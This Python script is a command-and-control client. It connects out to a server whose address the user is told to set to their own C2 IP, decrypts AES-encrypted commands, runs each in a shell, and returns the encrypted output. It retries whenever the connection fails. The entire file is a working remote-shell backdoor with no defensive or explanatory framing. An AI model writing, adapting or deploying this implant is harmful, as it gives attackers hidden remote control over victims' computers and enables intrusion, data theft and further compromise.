import socket
import subprocess
import json
import time
import base64
from Crypto.Cipher import AES

# AES setup (same keys as server)
key = b'[32_byte_key_here]'  # Must match server
iv = b'[16_byte_iv_here]'    # Must match server

def encrypt(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pad_len = 16 - (len(data) % 16)
    data += ' ' * pad_len
    return base64.b64encode(cipher.encrypt(data.encode()))

def decrypt(data):
    data = base64.b64decode(data)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(data).decode().strip()

def connect_to_c2():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("127.0.0.1", 8080))  # Change to your C2 IP
        while True:
            try:
                data = s.recv(4096)
                if not data:
                    break
                decrypted = decrypt(data)
                cmd = json.loads(decrypted)['cmd']
                result = subprocess.run(cmd, shell=True, capture_output=True)
                output = result.stdout.decode() + result.stderr.decode()
                s.send(encrypt(json.dumps({"output": output})))
            except Exception as e:
                print(f"[!] Error: {e}")
                break
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        time.sleep(10)
        connect_to_c2()

if __name__ == "__main__":
    connect_to_c2()
